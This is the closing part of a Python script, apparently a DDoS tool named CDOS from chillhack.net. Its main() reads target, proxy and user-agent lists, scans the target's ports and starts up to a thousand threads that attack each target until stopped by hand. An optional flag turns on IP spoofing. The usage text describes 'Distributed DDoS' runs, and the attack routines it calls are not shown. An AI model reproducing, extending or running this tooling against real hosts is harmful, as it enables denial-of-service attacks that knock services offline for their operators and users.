          Contact: info@chillhack.net
          Website: https://chillhack.net
""")

    global stop_flag
    parser = argparse.ArgumentParser(
        description="CDOS - Intelligent DDoS Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage Examples:
  Basic Attack: python3 cdos.py -t targets.txt
  Distributed DDoS: python3 cdos.py -t targets.txt -p proxies.txt
  Custom User-Agent: python3 cdos.py -t targets.txt -p proxies.txt -r agent_list.txt
  Specify Threads: python3 cdos.py -t targets.txt --threads 500
  Specify Workers per Port: python3 cdos.py -t targets.txt --workers-per-port 10
  Enable IP Spoofing: sudo python3 cdos.py -t targets.txt --spoof
"""
    )
    parser.add_argument('-t', '--target-file', required=True, help="Target IP/domain list file (TXT) or single target")
    parser.add_argument('-p', '--proxy-file', help="Proxy IP list file (TXT, format: IP:Port)")
    parser.add_argument('-r', '--agent-file', help="Custom User-Agent list file (TXT)")
    parser.add_argument('--threads', type=int, default=1000, help="Number of worker threads (default: 1000)")
    parser.add_argument('--workers-per-port', type=int, default=1, help="Number of workers per port (default: 1)")
    parser.add_argument('--spoof', action='store_true', help="Enable IP spoofing (requires root privileges)")

    args = parser.parse_args()

    # Check for root privileges if spoofing is enabled
    if args.spoof and os.geteuid() != 0:
        logging.error("IP spoofing requires root privileges. Use sudo.")
        sys.exit(1)

    # Check system thread limit
    try:
        with open('/proc/sys/kernel/threads-max', 'r') as f:
            max_threads = int(f.read().strip())
        if args.threads > max_threads:
            logging.warning(f"Requested threads {args.threads} exceeds system limit {max_threads}, adjusting to {max_threads}")
            args.threads = max_threads
    except:
        logging.warning("Unable to check system thread limit, consider reducing threads")

    # Load targets, proxies, and user agents
    targets = load_targets(args.target_file)
    proxies = load_proxies(args.proxy_file) if args.proxy_file else []
    user_agents = load_user_agents(args.agent_file)

    # Execute attack for each target
    for target in targets:
        logging.info(f"Processing target: {target} with {args.threads} threads")
        open_ports = scan_ports(target)
        if not open_ports:
            logging.warning(f"No open ports found for {target}, using default ports 80, 443, 53")
            open_ports = [80, 443, 53]

        workers.clear()
        threads = []
        start_time = datetime.now()  # Record attack start time
        num_workers = min(args.threads, len(open_ports) * args.workers_per_port)  # Total workers limited by threads or ports * workers_per_port
        port_assignments = []
        for port in open_ports:
            for _ in range(args.workers_per_port):
                port_assignments.append(port)
                if len(port_assignments) >= args.threads:
                    break
            if len(port_assignments) >= args.threads:
                break
        logging.info(f"Starting attack on {target} with {num_workers} workers across {len(open_ports)} ports")
        for i in range(num_workers):
            worker_id = f"Worker {i+1}"
            port = port_assignments[i % len(port_assignments)]  # Assign port from the generated list
            try:
                t = threading.Thread(target=select_attack, args=(target, port, None, proxies, worker_id, user_agents, args.spoof))
                t.daemon = True
                t.start()
                threads.append(t)
            except RuntimeError as e:
                logging.error(f"Failed to start worker {worker_id}: {e}")
                break
        # Display worker status
        display_thread = threading.Thread(target=display_workers, args=(target,))
        display_thread.daemon = True
        display_thread.start()

        # Keep attack running until manual stop (Ctrl+C)
        try:
            while True:
                time.sleep(1)  # Keep main thread alive
        except KeyboardInterrupt:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            logging.info(f"Attack stopped by user. Duration: {duration:.2f} seconds")
            stop_flag = True  # Set stop_flag after user interruption
            for t in threads:
                t.join(timeout=5)
            display_thread.join(timeout=5)

if __name__ == "__main__":
    main()
